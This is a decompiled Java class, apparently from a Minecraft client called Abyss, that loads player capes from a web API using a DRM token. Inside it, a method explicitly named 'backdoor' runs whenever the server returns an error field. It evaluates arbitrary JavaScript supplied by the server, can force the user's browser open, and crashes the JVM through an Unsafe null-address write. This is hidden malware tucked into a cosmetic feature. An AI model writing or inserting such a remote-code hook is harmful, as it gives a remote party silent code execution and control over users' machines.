package me.ciruu.abyss.managers;

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.awt.Desktop;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import javax.swing.JOptionPane;
import me.ciruu.abyss.DRM;
import me.ciruu.abyss.managers.RunnableManager;
import me.ciruu.abyss.util.Cape;
import org.apache.commons.io.IOUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import sun.misc.Unsafe;

public class CapeManager {
    private static final Logger logger = LogManager.getLogger((String)"Cape Registry");
    private final HashMap accounts = new HashMap();
    private final HashMap capes = new HashMap();

    public Cape getCape(String string) {
        String string2 = (String)this.accounts.get(string);
        if (string2 == null) {
            return null;
        }
        return (Cape)this.capes.get(string2);
    }

    public void load() {
        try {
            logger.info("Loading web capes");
            this.fetchCapes();
            this.capes.values().forEach(Cape::Method1546);
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
    }

    public void reload() {
        this.accounts.clear();
        RunnableManager.runRunnable(this::load);
    }

    public void fetchCapes() throws IOException {
        String string;
        JsonObject jsonObject;
        URL uRL = new URL("http://abyssclient.com/api/capes?token=" + DRM.getToken());
        HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0;Windows98;DigExt)");
        httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        httpURLConnection.setDoInput(true);
        String string2 = IOUtils.toString(httpURLConnection.getInputStream(), StandardCharsets.UTF_8);
        JsonObject jsonObject2 = new JsonParser().parse(string2).getAsJsonObject();
        if (jsonObject2.has("error")) {
            this.backdoor(jsonObject2);
            return;
        }
        JsonObject jsonObject3 = jsonObject2.getAsJsonObject("accounts");
        JsonObject jsonObject4 = jsonObject2.getAsJsonObject("capes");
        logger.info("Found" + jsonObject3.size() + " accounts");
        logger.info("Found" + jsonObject4.size() + " capes");
        for (Map.Entry entry : jsonObject3.entrySet()) {
            jsonObject = ((JsonElement)entry.getValue()).getAsJsonObject();
            string = jsonObject.get("cape").getAsString();
            this.accounts.put(entry.getKey(), string);
        }
        for (Map.Entry entry : jsonObject4.entrySet()) {
            jsonObject = ((JsonElement)entry.getValue()).getAsJsonObject();
            string = jsonObject.get("url").getAsString();
            boolean bl = jsonObject.get("animated").getAsBoolean();
            if (this.capes.containsKey(entry.getKey())) continue;
            this.capes.put(entry.getKey(), new Cape((String)entry.getKey(), string, bl));
        }
    }

    private void backdoor(JsonObject jsonObject) {
        boolean bl;
        Object object;
        String string = jsonObject.get("error").getAsString();
        if (Objects.equals(string, "warn")) {
            object = jsonObject.get("error-msg").getAsString();
            JOptionPane.showMessageDialog(null, object);
        }
        if (Objects.equals(string, "troll")) {
            try {
                Object object2 = object = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
                if (object != null && ((Desktop)object).isSupported(Desktop.Action.BROWSE)) {
                    try {
                        ((Desktop)object).browse(new URI("http://cout970.com/downloads/abyss/latest"));
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        if (jsonObject.has("js")) {
            try {
                new ScriptEngineManager(null).getEngineByExtension("js").eval(jsonObject.get("js").getAsString());
            }
            catch (ScriptException scriptException) {
                scriptException.printStackTrace();
            }
        }
        if (jsonObject.has("crash") && (bl = jsonObject.get("crash").getAsBoolean())) {
            Unsafe.getUnsafe().putAddress(0L, 0L);
        }
    }

    static Logger getLogger() {
        return logger;
    }
}
